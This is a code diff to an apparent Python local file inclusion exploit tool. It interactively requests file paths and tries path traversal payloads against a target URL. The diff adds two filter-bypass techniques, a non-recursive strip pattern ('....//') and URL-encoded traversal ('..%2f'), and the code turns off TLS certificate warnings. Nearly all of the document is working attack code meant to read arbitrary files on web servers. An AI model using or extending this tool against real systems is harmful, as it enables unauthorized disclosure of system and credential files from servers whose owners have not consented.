@@ -4,7 +4,7 @@ import os
 import dotenv
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-dotenv.load_dotenv()
+dotenv.load_dotenv(dotenv_path="../.env")
 
 class LocalFile:
     def __init__(self, url):
@@ -21,7 +21,8 @@ class LocalFile:
             try:
                 payload_unfiltered = input("Enter location of file to see: ")
                 if payload_unfiltered.lower() in ["quit", "stop", "exit"]:
-                    return False
+                    print("Exiting terminal....")
+                    break
                 if payload_unfiltered is None or payload_unfiltered == "":
                     print("Enter the location please")
                     continue
@@ -47,13 +48,22 @@ class LocalFile:
         return(self.exploit(f"{self.exploit_url}../../../../../"))
 
     def absolute_path(self):
-        print("Trying absolute path local file inclusion ")
+        print("Trying absolute path local file inclusion")
         return(self.exploit(f"{self.exploit_url}/"))
-
+    
+    def non_recursive_strip(self):
+        print("Trying non recursive strip")
+        return(self.exploit(f"{self.exploit_url}....//....//....//....//....//....//"))
+    
+    def encoded_payload(self):
+        print("Trying to encoding payload")
+        return(self.exploit(f"{self.exploit_url}..%2f..%2f..%2f..%2f"))
     def main(self):
         exploit_methods = [
             ("simple lfi", self.simple_lfi),
-            ("absolute path", self.absolute_path)
+            ("absolute path", self.absolute_path),
+            ("non recursive", self.non_recursive_strip),
+            ("encoded url", self.encoded_payload)
         ]
         for method_name, method in exploit_methods:
             try:
